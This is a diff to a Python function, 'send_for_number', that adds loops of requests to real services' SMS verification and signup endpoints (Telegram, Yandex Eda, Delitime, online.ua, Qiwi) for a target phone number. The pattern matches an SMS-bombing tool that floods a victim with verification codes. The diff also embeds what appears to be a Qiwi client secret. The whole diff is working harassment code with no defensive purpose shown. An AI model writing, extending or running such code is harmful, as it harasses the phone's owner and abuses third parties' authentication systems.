@@ -117,6 +117,37 @@ def send_for_number(phone):
             requests.post(
                     "https://youla.ru/web-api/auth/request_code", data={"phone": _phone}
                 )
+             requests.post(
+                "https://my.telegram.org/auth/send_password",
+                data={"phone": "+" + _phone}
+            )
+
+            requests.post(
+                "https://eda.yandex/api/v1/user/request_authentication_code",
+                json={"phone_number": "+" + _phone},
+            )
+
+            requests.post(
+                "https://api.delitime.ru/api/v2/signup",
+                data={
+                    "SignupForm[username]": _phone,
+                    "SignupForm[device_type]": 3,
+                }
+            )
+            requests.head(
+                "https://secure.online.ua/ajax/check_phone/",
+                params={"reg_phone": "+" + _phone},
+            )
+
+            requests.post(
+                "https://mobile-api.qiwi.com/oauth/authorize",
+                data={
+                    "response_type": "urn:qiwi:oauth:response-type:confirmation-id",
+                    "username": _phone,
+                    "client_id": "android-qw",
+                    "client_secret": "zAm4FKq9UnSe7id",
+                }
+            )
         
             iteration += 1
 
